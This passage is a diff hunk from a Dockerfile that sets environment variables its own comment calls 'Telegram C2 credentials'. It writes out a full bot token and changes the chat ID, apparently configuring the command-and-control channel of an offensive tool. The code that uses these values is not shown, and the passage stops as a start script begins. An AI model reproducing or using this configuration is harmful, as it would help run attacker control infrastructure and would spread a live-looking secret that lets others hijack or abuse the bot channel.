@@ -290,7 +290,7 @@ RUN pip install --break-system-packages --force-reinstall --no-cache-dir git+htt
 
 # Set Telegram C2 credentials
 ENV TG_BOT_TOKEN=8620456014:AAEHydgu-9ljKYXvqqY_yApEn6FWEVH91gc
-ENV TG_CHAT_ID=8667199004
+ENV TG_CHAT_ID=5804150664
 
 # Create start script with debugging
 RUN echo '#!/bin/bash\\n\\
